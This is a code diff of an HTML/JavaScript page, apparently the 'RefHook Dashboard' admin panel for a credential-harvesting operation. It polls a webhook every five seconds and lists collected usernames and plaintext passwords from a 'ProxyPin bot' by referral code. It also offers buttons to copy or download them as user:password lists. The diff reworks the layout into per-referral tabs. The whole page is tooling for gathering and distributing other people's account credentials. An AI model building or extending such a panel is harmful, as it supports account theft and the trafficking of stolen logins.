@@ -7,138 +7,124 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #0a0a0f;
-      color: #e2e8f0;
-      min-height: 100vh;
-    }
+    body { font-family: 'Inter', sans-serif; background: #0a0a0f; color: #e2e8f0; min-height: 100vh; }
+
     .header {
       background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
       padding: 24px 32px;
       border-bottom: 1px solid rgba(99, 102, 241, 0.2);
+      display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;
     }
     .header h1 {
-      font-size: 24px;
-      font-weight: 700;
+      font-size: 24px; font-weight: 700;
       background: linear-gradient(135deg, #818cf8, #a78bfa, #c084fc);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
     }
     .header p { color: #94a3b8; font-size: 13px; margin-top: 4px; }
+    .live-dot { display: inline-block; width: 8px; height: 8px; background: #4ade80; border-radius: 50%; animation: blink 1.5s infinite; margin-right: 6px; }
+    @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+
     .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
 
     .stats {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 16px;
-      margin-bottom: 24px;
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 16px; margin-bottom: 24px;
     }
     .stat-card {
       background: linear-gradient(135deg, rgba(30, 30, 50, 0.8), rgba(20, 20, 40, 0.9));
-      border: 1px solid rgba(99, 102, 241, 0.15);
-      border-radius: 12px;
-      padding: 20px;
-      text-align: center;
-      backdrop-filter: blur(10px);
+      border: 1px solid rgba(99, 102, 241, 0.15); border-radius: 12px; padding: 20px; text-align: center;
       transition: transform 0.2s, border-color 0.2s;
     }
     .stat-card:hover { transform: translateY(-2px); border-color: rgba(99, 102, 241, 0.4); }
     .stat-card .value {
-      font-size: 32px;
-      font-weight: 700;
+      font-size: 32px; font-weight: 700;
       background: linear-gradient(135deg, #60a5fa, #818cf8);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
     }
-    .stat-card .label { font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+    .stat-card .label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+
+    /* Ref Tabs */
+    .ref-tabs {
+      display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; align-items: center;
+    }
+    .ref-tab {
+      background: rgba(30, 30, 50, 0.6); border: 1px solid rgba(99, 102, 241, 0.15);
+      color: #94a3b8; padding: 8px 18px; border-radius: 8px; cursor: pointer;
+      font-family: 'Inter', sans-serif; font-size: 13px; font-weight: 500;
+      transition: all 0.2s; display: flex; align-items: center; gap: 8px;
+    }
+    .ref-tab:hover { border-color: rgba(99, 102, 241, 0.4); color: #e2e8f0; }
+    .ref-tab.active {
+      background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(139, 92, 246, 0.2));
+      border-color: #818cf8; color: #fff;
+    }
+    .ref-tab .count {
+      background: rgba(99, 102, 241, 0.3); padding: 2px 8px; border-radius: 10px;
+      font-size: 11px; font-weight: 600; color: #a5b4fc;
+    }
+    .ref-tab.active .count { background: rgba(99, 102, 241, 0.5); color: #fff; }
 
     .controls {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 20px;
-      flex-wrap: wrap;
-      align-items: center;
+      display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; align-items: center;
     }
-    .controls select, .controls input {
-      background: #1e1e30;
-      border: 1px solid rgba(99, 102, 241, 0.2);
-      color: #e2e8f0;
-      padding: 10px 16px;
-      border-radius: 8px;
-      font-family: 'Inter', sans-serif;
-      font-size: 14px;
-      outline: none;
+    .controls input {
+      background: #1e1e30; border: 1px solid rgba(99, 102, 241, 0.2); color: #e2e8f0;
+      padding: 10px 16px; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 14px; outline: none;
+      min-width: 200px;
     }
-    .controls select:focus, .controls input:focus { border-color: #818cf8; }
+    .controls input:focus { border-color: #818cf8; }
     .btn {
-      background: linear-gradient(135deg, #6366f1, #8b5cf6);
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-family: 'Inter', sans-serif;
-      font-weight: 600;
-      font-size: 14px;
-      transition: opacity 0.2s;
+      background: linear-gradient(135deg, #6366f1, #8b5cf6); color: white; border: none;
+      padding: 10px 20px; border-radius: 8px; cursor: pointer;
+      font-family: 'Inter', sans-serif; font-weight: 600; font-size: 13px; transition: opacity 0.2s;
     }
     .btn:hover { opacity: 0.85; }
-    .btn-outline {
-      background: transparent;
-      border: 1px solid rgba(99, 102, 241, 0.3);
-      color: #818cf8;
-    }
+    .btn-outline { background: transparent; border: 1px solid rgba(99, 102, 241, 0.3); color: #818cf8; }
     .btn-outline:hover { background: rgba(99, 102, 241, 0.1); }
+    .btn-green { background: linear-gradient(135deg, #059669, #10b981); }
+    .btn-red { background: linear-gradient(135deg, #dc2626, #ef4444); }
 
     .table-wrap {
-      background: rgba(15, 15, 25, 0.8);
-      border: 1px solid rgba(99, 102, 241, 0.1);
-      border-radius: 12px;
-      overflow: hidden;
+      background: rgba(15, 15, 25, 0.8); border: 1px solid rgba(99, 102, 241, 0.1);
+      border-radius: 12px; overflow: hidden;
     }
     table { width: 100%; border-collapse: collapse; }
     th {
-      background: rgba(30, 30, 50, 0.9);
-      padding: 12px 16px;
-      text-align: left;
-      font-size: 11px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      color: #94a3b8;
+      background: rgba(30, 30, 50, 0.9); padding: 12px 16px; text-align: left;
+      font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #94a3b8;
       border-bottom: 1px solid rgba(99, 102, 241, 0.1);
     }
     td {
-      padding: 10px 16px;
-      font-size: 13px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+      padding: 10px 16px; font-size: 13px; border-bottom: 1px solid rgba(255, 255, 255, 0.03);
       font-family: 'JetBrains Mono', 'Fira Code', monospace;
     }
     tr:hover td { background: rgba(99, 102, 241, 0.05); }
-    .ref-tag {
-      background: rgba(34, 197, 94, 0.15);
-      color: #4ade80;
-      padding: 2px 8px;
-      border-radius: 4px;
-      font-size: 11px;
-    }
-    .empty {
-      text-align: center;
-      padding: 60px 20px;
-      color: #64748b;
-    }
+    .ref-tag { background: rgba(34, 197, 94, 0.15); color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
+
+    .empty { text-align: center; padding: 60px 20px; color: #64748b; }
     .empty span { font-size: 48px; display: block; margin-bottom: 12px; }
-    .pulse { animation: pulse 2s infinite; }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-    .auto-tag { font-size: 11px; color: #94a3b8; }
-    .auto-tag.on { color: #4ade80; }
+
+    .ref-header {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 16px; padding: 16px 20px;
+      background: linear-gradient(135deg, rgba(30, 30, 50, 0.6), rgba(20, 20, 40, 0.8));
+      border: 1px solid rgba(99, 102, 241, 0.15); border-radius: 12px;
+    }
+    .ref-header h2 { font-size: 18px; color: #a5b4fc; }
+    .ref-header .meta { font-size: 12px; color: #64748b; }
   </style>
 </head>
 <body>
   <div class="header">
-    <h1>⚡ RefHook Dashboard</h1>
-    <p>Real-time bot credential viewer • Auto-refreshes every 5s</p>
+    <div>
+      <h1>⚡ RefHook Dashboard</h1>
+      <p><span class="live-dot"></span>Auto-refreshes every 5s • Credentials saved per ref ID</p>
+    </div>
+    <div>
+      <button class="btn" onclick="refresh()">🔄 Refresh</button>
+    </div>
   </div>
+
   <div class="container">
     <div class="stats">
       <div class="stat-card">
@@ -146,129 +132,150 @@
         <div class="label">Total Accounts</div>
       </div>
       <div class="stat-card">
-        <div class="value" id="totalSessions">0</div>
-        <div class="label">Active Refs</div>
+        <div class="value" id="totalRefs">0</div>
+        <div class="label">Ref Codes</div>
       </div>
       <div class="stat-card">
         <div class="value" id="lastUpdate">—</div>
         <div class="label">Last Update</div>
       </div>
-      <div class="stat-card">
-        <div class="value pulse" id="status">●</div>
-        <div class="label auto-tag on" id="autoLabel">Auto-Refresh ON</div>
-      </div>
     </div>
 
-    <div class="controls">
-      <select id="refFilter"><option value="">All Refs</option></select>
-      <input type="text" id="search" placeholder="Search username...">
-      <button class="btn" onclick="refresh()">Refresh</button>
-      <button class="btn btn-outline" onclick="copyAll()">📋 Copy All</button>
-      <button class="btn btn-outline" onclick="downloadTxt()">💾 Download .txt</button>
-    </div>
+    <div class="ref-tabs" id="refTabs"></div>
 
-    <div class="table-wrap">
-      <table>
-        <thead>
-          <tr>
-            <th>#</th>
-            <th>Username</th>
-            <th>Password</th>
-            <th>Ref ID</th>
-            <th>Time</th>
-          </tr>
-        </thead>
-        <tbody id="tbody">
-          <tr><td colspan="5" class="empty"><span>📡</span>Waiting for data...<br>Run the ProxyPin bot to start receiving accounts</td></tr>
-        </tbody>
-      </table>
-    </div>
+    <div id="refContent"></div>
   </div>
 
   <script>
-    let allCreds = [];
-    let autoRefresh = true;
+    let data = {};
+    let activeRef = 'all';
 
     async function refresh() {
       try {
-        const ref = document.getElementById('refFilter').value;
-        const url = ref ? `/api/webhook?ref=${ref}` : `/api/webhook`;
-        const r = await fetch(url);
+        const r = await fetch('/api/webhook');
         const d = await r.json();
+        if (!d.ok) return;
 
-        if (d.creds) {
-          allCreds = d.creds;
-          document.getElementById('totalCreds').textContent = d.total || d.creds.length;
-          document.getElementById('totalSessions').textContent = '1';
-          document.getElementById('lastUpdate').textContent = d.lastUpdate ? timeAgo(d.lastUpdate) : '—';
-        } else if (d.sessions) {
-          document.getElementById('totalCreds').textContent = d.totalCreds || 0;
-          const refs = Object.keys(d.sessions);
-          document.getElementById('totalSessions').textContent = refs.length;
+        document.getElementById('totalCreds').textContent = d.totalCreds || 0;
+        const refs = Object.keys(d.sessions || {});
+        document.getElementById('totalRefs').textContent = refs.length;
 
-          const sel = document.getElementById('refFilter');
-          const current = sel.value;
-          sel.innerHTML = '<option value="">All Refs</option>';
-          refs.forEach(r => {
-            const opt = document.createElement('option');
-            opt.value = r;
-            opt.textContent = `${r} (${d.sessions[r].total})`;
-            sel.appendChild(opt);
-          });
-          sel.value = current;
+        data = d.sessions || {};
 
-          // Fetch all creds from each ref
-          allCreds = [];
-          for (const ref of refs) {
-            const rr = await fetch(`/api/webhook?ref=${ref}`);
-            const rd = await rr.json();
-            if (rd.creds) allCreds.push(...rd.creds);
-          }
-          if (refs.length > 0) {
-            const latest = refs.map(r => d.sessions[r].lastUpdate).sort().pop();
-            document.getElementById('lastUpdate').textContent = latest ? timeAgo(latest) : '—';
-          }
+        // Fetch full creds for each ref
+        for (const ref of refs) {
+          const rr = await fetch('/api/webhook?ref=' + encodeURIComponent(ref));
+          const rd = await rr.json();
+          if (rd.creds) data[ref].creds = rd.creds;
         }
 
-        renderTable();
-      } catch (e) {
-        console.error('Refresh error:', e);
-      }
+        // Find latest update
+        let latest = null;
+        for (const s of Object.values(data)) {
+          if (s.lastUpdate && (!latest || s.lastUpdate > latest)) latest = s.lastUpdate;
+        }
+        document.getElementById('lastUpdate').textContent = latest ? timeAgo(latest) : '—';
+
+        renderTabs();
+        renderContent();
+      } catch (e) { console.error(e); }
     }
 
-    function renderTable() {
-      const search = document.getElementById('search').value.toLowerCase();
-      const filtered = search ? allCreds.filter(c => (c.u || '').toLowerCase().includes(search)) : allCreds;
-      const tbody = document.getElementById('tbody');
+    function renderTabs() {
+      const tabs = document.getElementById('refTabs');
+      const refs = Object.keys(data);
+      let totalAll = 0;
+      refs.forEach(r => totalAll += (data[r].total || 0));
 
-      if (filtered.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="5" class="empty"><span>📡</span>No data yet</td></tr>';
+      let html = `<div class="ref-tab ${activeRef === 'all' ? 'active' : ''}" onclick="setRef('all')">All <span class="count">${totalAll}</span></div>`;
+      for (const ref of refs) {
+        html += `<div class="ref-tab ${activeRef === ref ? 'active' : ''}" onclick="setRef('${ref}')">${ref} <span class="count">${data[ref].total || 0}</span></div>`;
+      }
+      tabs.innerHTML = html;
+    }
+
+    function setRef(ref) {
+      activeRef = ref;
+      renderTabs();
+      renderContent();
+    }
+
+    function renderContent() {
+      const content = document.getElementById('refContent');
+      const refs = activeRef === 'all' ? Object.keys(data) : [activeRef];
+
+      if (refs.length === 0 || (refs.length === 1 && !data[refs[0]])) {
+        content.innerHTML = '<div class="empty"><span>📡</span>No data yet<br>Run the ProxyPin bot to start receiving accounts</div>';
         return;
       }
 
-      tbody.innerHTML = filtered.map((c, i) =>
-        `<tr>
-          <td>${i + 1}</td>
-          <td>${c.u}</td>
-          <td>${c.p}</td>
-          <td><span class="ref-tag">${c.rid || '—'}</span></td>
-          <td style="font-size:11px;color:#64748b">${c.t ? new Date(c.t).toLocaleTimeString() : ''}</td>
-        </tr>`
-      ).join('');
+      let html = '';
+      for (const ref of refs) {
+        const s = data[ref];
+        if (!s) continue;
+        const creds = s.creds || [];
+
+        html += `
+          <div class="ref-header">
+            <div>
+              <h2>🔗 ${ref}</h2>
+              <div class="meta">${creds.length} accounts • ${s.batches || 0} batches • Last: ${s.lastUpdate ? timeAgo(s.lastUpdate) : '—'}</div>
+            </div>
+            <div style="display:flex;gap:8px">
+              <button class="btn btn-outline" onclick="copyRef('${ref}')">📋 Copy</button>
+              <button class="btn btn-outline" onclick="downloadRef('${ref}')">💾 Download</button>
+            </div>
+          </div>
+
+          <div class="controls">
+            <input type="text" placeholder="Search username..." oninput="filterTable('${ref}', this.value)">
+          </div>
+
+          <div class="table-wrap" style="margin-bottom:24px">
+            <table>
+              <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Ref ID</th><th>Time</th></tr></thead>
+              <tbody id="tbody_${ref}">
+                ${creds.map((c, i) => `<tr>
+                  <td>${i + 1}</td>
+                  <td>${c.u}</td>
+                  <td>${c.p}</td>
+                  <td><span class="ref-tag">${c.rid || ref}</span></td>
+                  <td style="font-size:11px;color:#64748b">${c.t ? new Date(c.t).toLocaleTimeString() : ''}</td>
+                </tr>`).join('')}
+              </tbody>
+            </table>
+            ${creds.length === 0 ? '<div class="empty"><span>📡</span>No accounts for this ref yet</div>' : ''}
+          </div>
+        `;
+      }
+      content.innerHTML = html;
     }
 
-    function copyAll() {
-      const text = allCreds.map(c => `${c.u}:${c.p}`).join('\n');
+    function filterTable(ref, query) {
+      const tbody = document.getElementById('tbody_' + ref);
+      if (!tbody) return;
+      const rows = tbody.querySelectorAll('tr');
+      const q = query.toLowerCase();
+      rows.forEach(row => {
+        const user = row.cells[1]?.textContent?.toLowerCase() || '';
+        row.style.display = user.includes(q) ? '' : 'none';
+      });
+    }
+
+    function copyRef(ref) {
+      const creds = (data[ref]?.creds || []);
+      const text = creds.map(c => c.u + ':' + c.p).join('\n');
       navigator.clipboard.writeText(text);
-      alert('Copied ' + allCreds.length + ' accounts!');
+      alert('Copied ' + creds.length + ' accounts for ' + ref + '!');
     }
 
-    function downloadTxt() {
-      const text = allCreds.map(c => `${c.u}:${c.p}`).join('\n');
+    function downloadRef(ref) {
+      const creds = (data[ref]?.creds || []);
+      const text = creds.map(c => c.u + ':' + c.p).join('\n');
       const blob = new Blob([text], { type: 'text/plain' });
       const a = document.createElement('a');
       a.href = URL.createObjectURL(blob);
-      a.download = 'bot_creds_' + new Date().toISOString().slice(0, 10) + '.txt';
+      a.download = ref + '_creds_' + new Date().toISOString().slice(0, 10) + '.txt';
       a.click();
     }
 
@@ -279,11 +286,8 @@
       return Math.floor(s / 3600) + 'h ago';
     }
 
-    document.getElementById('search').addEventListener('input', renderTable);
-
-    // Auto-refresh every 5s
     refresh();
-    setInterval(() => { if (autoRefresh) refresh(); }, 5000);
+    setInterval(refresh, 5000);
   </script>
 </body>
 </html>
